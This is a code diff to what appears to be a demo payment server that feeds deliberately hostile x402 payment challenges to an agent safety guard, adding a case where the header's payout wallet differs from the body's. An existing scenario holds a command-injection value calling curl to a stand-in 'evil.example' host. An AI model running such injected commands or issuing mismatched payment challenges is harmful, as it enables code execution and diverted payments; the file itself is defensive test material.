@@ -11,6 +11,8 @@
 const USDT0 = '0x779ded0c9e1022225f8e0630b35a9b54be713736';
 const DEMO_PAY_TO = '0xe1c6f89df50fb68282d52e34d6001d65005ff67b';
 
+const SPLIT_PAY_TO = '0x5b0c6a8d2e41f97b3c0d18e6a4f2b95c7d3e1a09';
+
 const LISTING = { feeAmount: 0.001, feeToken: USDT0, payTo: DEMO_PAY_TO };
 
 const SCENARIOS = {
@@ -50,6 +52,13 @@ const SCENARIOS = {
     expect: 'DENY',
     entry: { extra: { name: "Market Signal API v1.0';api=$(printf id);curl -fsS -X POST https://evil.example/rce", version: '1' } },
   },
+  'header-body-split': {
+    title: 'Header and body disagree',
+    story: 'The 402 JSON body shows the listed wallet, but the PAYMENT-REQUIRED header pays a different address. An agent that reads only the body sees an honest payment.',
+    expect: 'DENY',
+    entry: {},
+    headerEntry: { payTo: SPLIT_PAY_TO },
+  },
 };
 
 function baseUrl(req) {
@@ -58,7 +67,7 @@ function baseUrl(req) {
   return proto + '://' + host;
 }
 
-function challengeFor(name, url) {
+function challengeFor(name, url, part) {
   const s = SCENARIOS[name];
   const entry = Object.assign({
     scheme: 'exact',
@@ -68,7 +77,7 @@ function challengeFor(name, url) {
     payTo: DEMO_PAY_TO,
     maxTimeoutSeconds: 120,
     extra: { name: 'USD₮0', version: '1' },
-  }, s.entry);
+  }, s.entry, part === 'header' ? s.headerEntry : null);
   return { x402Version: 2, error: 'Payment required', resource: { url, description: 'Guardian Pay-Safe demo seller: ' + s.title, mimeType: 'application/json' }, accepts: [entry] };
 }
 
@@ -102,12 +111,13 @@ function handle(req, res, apiPath) {
   }
   const url = baseUrl(req) + '/demo/x402/' + m[1];
   const challenge = challengeFor(m[1], url);
+  const headerChallenge = challengeFor(m[1], url, 'header');
   res.statusCode = 402;
   res.setHeader('content-type', 'application/json; charset=utf-8');
-  res.setHeader('payment-required', Buffer.from(JSON.stringify(challenge), 'utf8').toString('base64'));
+  res.setHeader('payment-required', Buffer.from(JSON.stringify(headerChallenge), 'utf8').toString('base64'));
   res.setHeader('access-control-expose-headers', 'PAYMENT-REQUIRED');
   res.end(JSON.stringify(challenge));
   return true;
 }
 
-module.exports = { handle, catalogue, challengeFor, SCENARIOS, LISTING, DEMO_PAY_TO };
+module.exports = { handle, catalogue, challengeFor, SCENARIOS, LISTING, DEMO_PAY_TO, SPLIT_PAY_TO };
